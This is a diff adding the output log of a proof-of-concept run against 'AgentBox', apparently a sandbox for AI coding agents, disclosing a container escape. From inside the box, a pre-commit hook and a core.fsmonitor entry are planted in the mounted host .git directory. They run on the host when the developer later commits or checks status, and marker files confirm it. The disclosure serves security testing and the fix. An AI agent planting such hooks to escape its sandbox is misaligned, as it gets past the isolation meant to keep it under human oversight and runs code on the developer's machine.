@@ -1,0 +1,47 @@
+
+== 0. Preconditions ==
+   box image:        agentbox-poc-mini:latest (runs as uid 1000, no caps, no --privileged)
+   host developer:   uid 1000 (ubuntu), home /home/ubuntu
+   proof marker:     /home/ubuntu/.agentbox_poc_pwned (must NOT exist yet)
+
+== 1. Set up a host project git repo (owned by the host developer) ==
+   created host repo at /tmp/agentbox-poc.94iUt4/myproject (f0f8b9a)
+   hooks dir before box: 14 sample files, no active pre-commit
+
+== 2. Start a box with AgentBox's exact mount and plant the payload from inside ==
+   mount reproduced verbatim:  -v /tmp/agentbox-poc.94iUt4/myproject/.git:/tmp/agentbox-poc.94iUt4/myproject/.git   (RW, same path as create.ts:724)
+   [box] I am uid=1000 gid=1000 groups=1000 on host 'the-box'; the mounted host .git is at: /tmp/agentbox-poc.94iUt4/myproject/.git
+   [box] planted /tmp/agentbox-poc.94iUt4/myproject/.git/hooks/pre-commit
+   [box] set core.fsmonitor = /tmp/agentbox-poc.94iUt4/myproject/.git/fsm in /tmp/agentbox-poc.94iUt4/myproject/.git/config
+   box has exited. The host repo's .git now carries the box-planted payload.
+
+== 3. The host developer runs a routine git command in their own repo ==
+   This is the intended AgentBox workflow: the human reviews/commits on the host.
+warning: Empty last update token.
+   developer runs: git commit -m 'progress'
+warning: Empty last update token.
+warning: Empty last update token.
+   developer runs: git status
+
+== 4. Result ==
+VULNERABLE -- the box executed code on the HOST. Marker /home/ubuntu/.agentbox_poc_pwned:
+
+     PWNED via .git/hooks/pre-commit
+     when:     Wed Jul 15 23:21:20 UTC 2026
+     ran as:   uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+     on host:  vm
+     uname:    Linux vm 6.18.5 #1 SMP PREEMPT_DYNAMIC @0 x86_64 x86_64 x86_64 GNU/Linux
+     PWNED via .git/config core.fsmonitor
+     when:    Wed Jul 15 23:21:20 UTC 2026
+     ran as:  uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+     on host: vm
+     PWNED via .git/config core.fsmonitor
+     when:    Wed Jul 15 23:21:20 UTC 2026
+     ran as:  uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+     on host: vm
+
+   The box (uid 1000, unprivileged container, hostname 'the-box') planted the
+   payload; it ran on the HOST (hostname 'vm') as the host developer.
+
+== 5. Cleanup ==
+   removed /tmp/agentbox-poc.94iUt4 and /home/ubuntu/.agentbox_poc_pwned
